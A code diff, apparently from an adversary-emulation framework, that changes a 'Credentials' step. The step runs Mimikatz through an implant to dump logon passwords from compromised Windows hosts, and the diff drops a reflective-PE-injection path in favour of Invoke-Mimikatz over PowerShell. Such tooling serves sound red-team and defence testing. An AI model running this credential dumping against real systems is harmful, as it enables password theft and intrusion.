@@ -224,17 +224,10 @@ class Credentials(Step):
     async def action(operation, rat, host, domain_g, credential_g, user_g):
         mimikatz_command = MimikatzCommand(privilege_debug(), sekurlsa_logonpasswords(), mimi_exit())
 
-        if host.os_version.major_version >= 10:
-            # Pass compiled mimikatz.exe into Invoke-ReflectivePEInjection PowerSploit script.  This works on
-            # windows 10 and patched older systems (KB3126593 / MS16-014 update installed)
-            accounts = await operation.reflectively_execute_exe(rat, "mimi64-exe", mimikatz_command.command,
-                                                                parsers.mimikatz.sekurlsa_logonpasswords_condensed)
-        else:
-            # Use Invoke-Mimikatz (trouble getting this working on Windows 10 as of 8/2017).
-            accounts = await operation.execute_powershell(rat, "powerkatz",
-                                                          PSFunction("Invoke-Mimikatz",
-                                                                     PSArg("Command", mimikatz_command.command)),
-                                                          parsers.mimikatz.sekurlsa_logonpasswords_condensed)
+        accounts = await operation.execute_powershell(rat, "powerkatz",
+                                                      PSFunction("Invoke-Mimikatz",
+                                                                 PSArg("Command", mimikatz_command.command)),
+                                                      parsers.mimikatz.sekurlsa_logonpasswords_condensed)
 
         for account in accounts:
             user_obj = {'username': account['Username'].lower(), 'is_group': False}
